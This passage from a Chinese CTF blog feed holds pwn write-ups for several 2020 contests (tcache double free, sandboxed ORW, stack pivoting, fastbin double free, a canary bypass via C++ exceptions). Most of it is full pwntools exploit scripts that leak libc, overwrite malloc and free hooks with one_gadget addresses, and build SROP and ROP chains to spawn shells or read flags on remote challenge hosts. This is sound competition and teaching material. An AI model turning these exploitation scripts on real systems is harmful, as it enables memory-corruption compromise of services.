class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'666'</span>)    sa(<span class="hljs-string">'hack'</span>,str(data))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):    add(i,<span class="hljs-number">0x8</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(i))    sla(<span class="hljs-string">':'</span>,str(<span class="hljs-number">0</span>))free(<span class="hljs-number">7</span>)show(<span class="hljs-number">3</span>)ru(<span class="hljs-string">': '</span>)heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x2c0</span>info_addr(<span class="hljs-string">'heap'</span>,heap_base)add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>,<span class="hljs-number">30</span>):    add(i,<span class="hljs-number">0x58</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>,<span class="hljs-number">29</span>):    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(i))    sla(<span class="hljs-string">':'</span>,str(<span class="hljs-number">0</span>))free(<span class="hljs-number">27</span>)sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'5'</span>)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'666'</span>)ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x264140</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = p64(libc_base +<span class="hljs-number">0x1e75a8</span>)sla(<span class="hljs-string">'hack'</span>,payload)payload = p64(libc_base +<span class="hljs-number">0x52fd0</span>)backdoor(payload)backdoor(payload)backdoor(payload)backdoor(payload)add(<span class="hljs-number">38</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">38</span>)itr()</code></pre></div><h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><p>其在用realloc free以后，写好size，还是可以正常使用编辑功能的。然后改掉由于<code>e-&gt;key = tcache;</code> 产生的<code>tcache_entry</code>的值，改为0即可。这样就绕过了<code>_int_free</code> 中对于double free的检测。接着再次free 这个堆块即可造成double free。接着完成利用即可。</p><h2 id="manager"><a href="#manager" class="headerlink" title="manager"></a>manager</h2><ul><li>和上题一样，还是realloc搭配free构造出uaf</li><li>开启了沙箱，只能orw</li><li>控制heap上一个chunk的name字段，利用edit name功能，实现free hook的改写</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'122.112.231.25'</span>,<span class="hljs-number">8004</span>)    libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,idx,size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">':'</span>,str(name))    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(size))    sla(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,choice,size,data)</span>:</span>    <span class="hljs-keyword">if</span> size == <span class="hljs-number">0</span> :        sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)        sla(<span class="hljs-string">':'</span>,str(idx))        sla(<span class="hljs-string">':'</span>,str(choice))        sla(<span class="hljs-string">":"</span>,str(size))        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>    <span class="hljs-keyword">if</span> choice ==<span class="hljs-number">1</span>:        sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)        sla(<span class="hljs-string">':'</span>,str(idx))        sla(<span class="hljs-string">':'</span>,str(choice))        sla(<span class="hljs-string">"name:"</span>,str(data))        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(choice))    sla(<span class="hljs-string">":"</span>,str(size))    sla(<span class="hljs-string">":"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))sla(<span class="hljs-string">'1'</span>,<span class="hljs-string">'\x01\x02\x03'</span> + <span class="hljs-string">'\x00'</span>)sla(<span class="hljs-string">'2'</span>,<span class="hljs-string">'\x01\x03\xde'</span> + <span class="hljs-string">'\x00'</span>)payload = <span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\x71'</span> + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">6</span> add(payload,<span class="hljs-number">0</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">1</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">5</span>,<span class="hljs-number">0x8</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">6</span>,<span class="hljs-number">0x8</span>,<span class="hljs-string">'1'</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'fo:'</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)edit(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + libcbasepayload = p64(<span class="hljs-number">0</span>) + p64(free_hook - <span class="hljs-number">0x20</span>)show(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'fo:'</span>)heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3b0</span>- <span class="hljs-number">0x20</span>info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>,p64(heapbase + <span class="hljs-number">0x540</span>))add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x68</span>,p64(libcbase + <span class="hljs-number">0x3c4aed</span>))payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(heapbase + <span class="hljs-number">0x580</span>) + p64(<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) +p64(free_hook) + p64(<span class="hljs-number">6</span>) + p64(heapbase + <span class="hljs-number">0x5e0</span>)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0x68</span>,payload)edit(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0x47b85</span> + libcbase),p64(<span class="hljs-number">0x47b85</span> + libcbase))frame = SigreturnFrame()frame.rdi = <span class="hljs-number">0</span>frame.rsi = free_hook + <span class="hljs-number">0x20</span>frame.rdx = <span class="hljs-number">0x200</span>frame.rsp = free_hook + <span class="hljs-number">0x20</span>frame.rip = libcbase + libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()payload = str(frame)[<span class="hljs-number">0x40</span>:]add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0x100</span>,payload)orw = shellcraft.open(<span class="hljs-string">'./flag'</span>) + shellcraft.read(<span class="hljs-number">3</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>)pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next() +libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next() +libcbasepop_rdx = libcbase+libc.search(asm(<span class="hljs-string">"pop rdx \nret"</span>)).next()rop = flat([pop_rdi,free_hook - <span class="hljs-number">0x7a8</span>,pop_rsi,<span class="hljs-number">0x1000</span>,pop_rdx,<span class="hljs-number">7</span>,libc.sym[<span class="hljs-string">'mprotect'</span>]+ libcbase,free_hook + <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span> * <span class="hljs-number">8</span>])free(<span class="hljs-number">11</span>)sleep(<span class="hljs-number">0.1</span>)pyaload = rop + asm(orw)s(pyaload)itr()</code></pre></div><h3 id="小记-1"><a href="#小记-1" class="headerlink" title="小记"></a>小记</h3><p>此题中，不能用realloc来操作一个unsortbin，由于其特性，不过size是多大，都会破坏掉<code>main_arena</code>上unsortbin相关的字段，造成接下来无法进行利用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>铁人三项2020第二赛区 pwn</title>
    <link href="/2020/11/04/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B92020%E7%AC%AC%E4%BA%8C%E8%B5%9B%E5%8C%BA%20pwn/"/>
    <url>/2020/11/04/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B92020%E7%AC%AC%E4%BA%8C%E8%B5%9B%E5%8C%BA%20pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="铁人三项2020第二赛区-pwn"><a href="#铁人三项2020第二赛区-pwn" class="headerlink" title="铁人三项2020第二赛区 pwn"></a>铁人三项2020第二赛区 pwn</h1><h2 id="stackstorm"><a href="#stackstorm" class="headerlink" title="stackstorm"></a>stackstorm</h2><p>程序存在栈溢出可以溢出0x10的字节，考虑栈迁移。一共可以触发2次，第一次用来泄漏出栈地址，第二次用泄漏的栈地址，栈迁移，在可控的输入区，进行rop，泄漏出libc地址。然后，让其返回start开始处，清理栈进行第3次的漏洞利用，这个时候时间覆盖返回地址为one gadget即可。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./stackstorm'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.15.32'</span>,<span class="hljs-number">9999</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload1= <span class="hljs-string">'1'</span> *<span class="hljs-number">0x300</span>sla(<span class="hljs-string">'data1'</span>,payload1)<span class="hljs-comment"># debug()</span>sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment"># r()</span>payload2 = <span class="hljs-string">'1'</span> * (<span class="hljs-number">0x70</span><span class="hljs-number">-1</span>) + <span class="hljs-string">'!'</span>sa(<span class="hljs-string">'data2'</span>,payload2)ru(<span class="hljs-string">'!'</span>)stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'stack'</span>,stack)pop_rdi = <span class="hljs-number">0x0000000000400903</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000400901</span>l_ret = <span class="hljs-number">0x00000000004007c1</span>payload1= <span class="hljs-string">'2'</span> *<span class="hljs-number">0x300</span>sla(<span class="hljs-string">'data1'</span>,payload1)<span class="hljs-comment"># debug()</span>sleep(<span class="hljs-number">0.1</span>)payload3 = p64(<span class="hljs-number">0</span>) + flat([pop_rdi,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],p64(<span class="hljs-number">0x0000000000400650</span>)])payload3 = payload3.ljust((<span class="hljs-number">0x70</span>),<span class="hljs-string">'\x00'</span>)payload3 += p64(stack<span class="hljs-number">-0x90</span>) + p64(l_ret)sa(<span class="hljs-string">'data2'</span>,payload3)sleep(<span class="hljs-number">0.1</span>)r()r(<span class="hljs-number">1</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20740</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)rec = <span class="hljs-number">0x4526a</span> + libcbasepayload4= <span class="hljs-string">'3'</span> *<span class="hljs-number">0x300</span>sla(<span class="hljs-string">'data1'</span>,payload4)<span class="hljs-comment"># debug()</span>sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment"># r()</span>payload5 = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x70</span>) + p64(rec) *<span class="hljs-number">2</span>sa(<span class="hljs-string">'data2'</span>,payload5)itr()</code></pre></div><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li><li>add堆时，写入title 字段存在溢出，可以覆盖到堆地址</li></ul><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">read_diy</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2)</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+13h] [rbp-Dh]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= a2; ++i )                   <span class="hljs-comment">// 存在溢出</span>  &#123;    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1u</span>LL) &lt; <span class="hljs-number">0</span> )      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    *(_BYTE *)(a1 + i) = buf;    <span class="hljs-keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="hljs-number">10</span> )    &#123;      *(_BYTE *)(i + a1) = <span class="hljs-number">0</span>;      <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>攻击思路：<br>先泄漏出来libc地址，释放A B C 3个0x68大小的堆块，接着申请一个0x68大小堆的时候触发一下title的溢出，其会是修改一下其申请到的堆地址的最后一个字节，使其指向刚刚释放过的chunk A，然后再释放这个堆，就构成了double free，劫持fastbin 打 malloc hook 为one gadget 。拿到shell。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./note'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.15.32'</span>,<span class="hljs-number">10002</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,title,data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sla(<span class="hljs-string">'le:'</span>,str(title))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'ote'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'ote'</span>,str(idx))add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)<span class="hljs-comment"># debug()</span>show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">"note content: "</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4c31</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)<span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,str(<span class="hljs-number">0x68</span>))payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">16</span> + <span class="hljs-string">'\x10'</span>sla(<span class="hljs-string">'le:'</span>,str(payload))free(<span class="hljs-number">1</span>)payload = <span class="hljs-number">0x3c4aed</span> + libcbaseadd(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,p64(payload))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,p64(payload))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,p64(payload))payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1147</span> + libcbase)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,payload)<span class="hljs-comment"># debug()</span>itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>湖湘杯ctf2020部分wp</title>
    <link href="/2020/11/04/%E6%B9%96%E6%B9%98%E6%9D%AFctf2020%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/11/04/%E6%B9%96%E6%B9%98%E6%9D%AFctf2020%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="湖湘杯ctf2020部分wp"><a href="#湖湘杯ctf2020部分wp" class="headerlink" title="湖湘杯ctf2020部分wp"></a>湖湘杯ctf2020部分wp</h1><h2 id="blend-pwn"><a href="#blend-pwn" class="headerlink" title="blend pwn"></a>blend pwn</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf （del的函数）</li><li>fmt （show name 的函数）</li><li>后门函数存在栈溢出</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先用fmt泄漏出来栈地址 libc地址备用，然后发现只能申请2次的chunk，已经不能进行fastbin attack，只能泄漏一下heap地址，重点研究下后门函数。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">backdoor</span><span class="hljs-params">()</span></span>&#123;  _QWORD *v0; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input what you want:"</span>);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)read_diy(&amp;v2, <span class="hljs-number">0x28</span>) &gt; <span class="hljs-number">0x10</span> )  &#123;    v0 = (_QWORD *)_cxa_allocate_exception(<span class="hljs-number">8L</span>L, <span class="hljs-number">0x28</span>LL);    *v0 = <span class="hljs-string">"You are too young!"</span>;    _cxa_throw(v0, &amp;`typeinfo <span class="hljs-keyword">for</span>'<span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span>*, <span class="hljs-number">0L</span>L);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre></div><p>发现了存在8字节的栈溢出，可以溢出到rbp，但是此时已经破坏了canary。</p><p>去百度后发现<code>_cxa_allocate_exception</code>的妙用，覆盖好rbp后，其可以完成过canary的检测且可以配合上层函数的<code>leave ret</code>,完成一个栈迁移的效果。</p><p>参考链接：<br><a href="https://www.anquanke.com/post/id/89855#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/89855#h3-8</a></p><p>所以就覆盖rbp为heap的地址，在上面存好one gadget 地址，ret 上去即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'47.111.104.169'</span>,<span 